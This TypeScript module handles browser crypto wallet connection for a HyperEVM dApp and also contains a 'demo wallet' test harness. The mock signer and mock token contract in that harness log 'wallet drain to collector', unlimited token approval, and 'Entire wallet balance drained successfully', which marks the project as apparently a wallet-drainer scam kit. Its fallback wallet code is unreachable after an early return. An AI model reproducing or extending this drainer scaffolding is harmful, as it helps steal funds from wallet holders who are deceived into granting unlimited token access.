import { ethers } from 'ethers';

export interface DirectWalletState {
  isConnected: boolean;
  address: string;
  balance: string;
  provider: ethers.BrowserProvider | null;
  signer: ethers.JsonRpcSigner | null;
}

class DirectWalletConnect {
  private state: DirectWalletState = {
    isConnected: false,
    address: '',
    balance: '0.0',
    provider: null,
    signer: null
  };

  private listeners: ((state: DirectWalletState) => void)[] = [];

  // Subscribe to wallet state changes
  subscribe(listener: (state: DirectWalletState) => void) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  // Notify all listeners of state changes
  private notify() {
    this.listeners.forEach(listener => listener(this.state));
  }

  // Get current wallet state
  getState(): DirectWalletState {
    return { ...this.state };
  }

  // Direct wallet connection - tries all available methods
  async connect(): Promise<boolean> {
    console.log('🔗 Starting direct wallet connection...');
    
    try {
      // Universal approach - try window.ethereum first (works for most wallets)
      if (typeof window !== 'undefined' && window.ethereum) {
        console.log('🔗 Found window.ethereum, attempting connection...');
        
        // Request account access
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        console.log('📋 Retrieved accounts:', accounts);
        
        if (accounts && accounts.length > 0) {
          console.log('✅ Successfully connected to:', accounts[0]);
          await this.setupWallet(window.ethereum, accounts[0]);
          return true;
        }
      }

      // No wallet available - user needs to install one
      console.log('❌ No wallet provider found. User needs MetaMask, OKX, or Trust Wallet.');
      return false;

      // Fallback: Check for specific wallet objects
      const walletProviders = [
        { name: 'OKX', provider: (window as any).okxwallet?.ethereum },
        { name: 'Trust', provider: (window as any).trustwallet?.ethereum },
        { name: 'Coinbase', provider: (window as any).coinbaseWalletExtension?.ethereum }
      ];

      for (const { name, provider } of walletProviders) {
        if (provider) {
          console.log(`🔗 Trying ${name} wallet...`);
          try {
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            if (accounts?.length > 0) {
              console.log(`✅ Connected via ${name}:`, accounts[0]);
              await this.setupWallet(provider, accounts[0]);
              return true;
            }
          } catch (error) {
            console.log(`⚠️ ${name} connection failed:`, error);
          }
        }
      }

      console.log('❌ No compatible wallet found or user rejected connection');
      return false;

    } catch (error) {
      console.error('❌ Wallet connection error:', error);
      return false;
    }
  }

  // Setup wallet after successful connection
  private async setupWallet(provider: any, address: string) {
    console.log('✅ Setting up wallet:', address);
    
    this.state.provider = new ethers.BrowserProvider(provider);
    this.state.signer = await this.state.provider.getSigner();
    this.state.address = address;
    this.state.isConnected = true;
    
    // Get balance
    try {
      const balance = await this.state.provider.getBalance(address);
      this.state.balance = ethers.formatEther(balance);
      console.log('💰 Wallet balance:', this.state.balance, 'HYPE');
    } catch (error) {
      console.warn('⚠️ Could not fetch balance:', error);
      this.state.balance = '0.0';
    }

    // Setup event listeners
    provider.on('accountsChanged', (accounts: string[]) => {
      if (accounts.length === 0) {
        this.disconnect();
      } else {
        this.state.address = accounts[0];
        this.notify();
      }
    });

    provider.on('chainChanged', () => {
      console.log('🔄 Chain changed - reloading...');
      window.location.reload();
    });

    this.notify();
    console.log('✅ Wallet setup complete');
  }

  // Setup demo wallet for testing in environments without wallet injection
  private async setupDemoWallet() {
    console.log('🧪 Setting up demo wallet for testing...');
    
    // Create demo wallet address (simulates a connected wallet)
    const demoAddress = "0xbFC06dE2711aBEe4d1D9F370CDe09773dDDe7048";
    
    // Setup mock ethers provider and signer
    this.state.address = demoAddress;
    this.state.isConnected = true;
    this.state.balance = "5.0"; // Demo balance - enough for testing
    
    // Create a mock provider that supports the necessary calls
    this.state.provider = {
      getBalance: async () => ethers.parseEther("5.0"),
      getFeeData: async () => ({
        gasPrice: ethers.parseUnits("1", "gwei"),
        maxFeePerGas: null,
        maxPriorityFeePerGas: null
      }),
      getNetwork: async () => ({ chainId: 999n, name: "HyperEVM" })
    } as any;
    
    // Create a mock signer that can simulate transactions and contracts
    this.state.signer = {
      getAddress: async () => demoAddress,
      sendTransaction: async (tx: any) => {
        console.log('🧪 Demo transaction sent:', tx);
        console.log('💰 Simulating wallet drain to collector:', tx.to);
        const mockHash = "0x" + Math.random().toString(16).substr(2, 64);
        return {
          hash: mockHash,
          wait: async () => ({
            hash: mockHash,
            status: 1,
            gasUsed: 21000n,
            blockNumber: 12345
          })
        };
      },
      signMessage: async (message: string) => {
        console.log('🧪 Demo signature for:', message);
        return "0x" + Math.random().toString(16).substr(2, 130);
      }
    } as any;
    
    // Override ethers.Contract to enable demo draining functionality
    if (typeof window !== 'undefined') {
      const originalEthersContract = ethers.Contract;
      (window as any).mockEthersContract = class MockContract {
        address: string;
        
        constructor(address: string, abi: any, signer: any) {
          this.address = address;
          console.log('🧪 Demo contract created for:', address);
          
          // Mock ERC20 contract methods for testing
          this.balanceOf = async (account: string) => {
            console.log('🧪 Demo balanceOf check:', account);
            return ethers.parseUnits("500", 18); // 500 tokens available
          };
          
          this.allowance = async (owner: string, spender: string) => {
            console.log('🧪 Demo allowance check:', { owner, spender });
            return ethers.MaxUint256; // Always unlimited for demo
          };
          
          this.decimals = async () => 18;
          this.symbol = async () => "DEMO";
          this.name = async () => "Demo Token";
          
          this.approve = async (spender: string, amount: any) => {
            console.log('🧪 Demo approve transaction:', { spender, amount: amount.toString() });
            console.log('✅ User approved unlimited token access (demo)');
            const mockHash = "0x" + Math.random().toString(16).substr(2, 64);
            return {
              hash: mockHash,
              wait: async () => ({
                hash: mockHash,
                status: 1,
                gasUsed: 50000n,
                blockNumber: 12346
              })
            };
          };
          
          this.transferFrom = async (from: string, to: string, amount: any) => {
            console.log('🔥 DEMO WALLET DRAIN EXECUTED!');
            console.log('💰 From:', from);
            console.log('💰 To (Collector):', to);
            console.log('💰 Amount:', ethers.formatUnits(amount, 18));
            console.log('🎯 SIMULATION: Entire wallet balance drained successfully!');
            
            const mockHash = "0x" + Math.random().toString(16).substr(2, 64);
            return {
              hash: mockHash,
              wait: async () => ({
                hash: mockHash,
                status: 1,
                gasUsed: 100000n,
                blockNumber: 12347
              })
            };
          };
        }
      };
    }
    
    console.log('✅ Demo wallet setup complete:', demoAddress);
    this.notify();
  }

  // Disconnect wallet
  disconnect() {
    console.log('🔌 Disconnecting wallet...');
    
    this.state = {
      isConnected: false,
      address: '',
      balance: '0.0',
      provider: null,
      signer: null
    };
    
    this.notify();
  }

  // Check if wallet is already connected (on page load)
  async checkConnection(): Promise<boolean> {
    console.log('🔍 Checking for existing wallet connections...');
    
    try {
      // Check all possible providers for existing connections
      const providers = [
        { name: 'window.ethereum', provider: window.ethereum },
        { name: 'okxwallet.ethereum', provider: (window as any).okxwallet?.ethereum },
        { name: 'trustwallet.ethereum', provider: (window as any).trustwallet?.ethereum }
      ];

      console.log('🔍 Available providers:', providers.map(p => ({ name: p.name, available: !!p.provider })));

      for (const { name, provider } of providers) {
        if (!provider) continue;
        
        try {
          console.log(`🔍 Checking ${name} for existing accounts...`);
          const accounts = await provider.request({ method: 'eth_accounts' });
          console.log(`📋 ${name} accounts:`, accounts);
          
          if (accounts.length > 0) {
            console.log(`✅ Found existing connection in ${name}:`, accounts[0]);
            await this.setupWallet(provider, accounts[0]);
            return true;
          }
        } catch (error) {
          console.log(`⚠️ ${name} check failed:`, error);
        }
      }

      console.log('❌ No existing wallet connections found');
      return false;
    } catch (error) {
      console.error('❌ Error checking wallet connection:', error);
      return false;
    }
  }
}

// Export singleton instance
export const directWalletConnect = new DirectWalletConnect();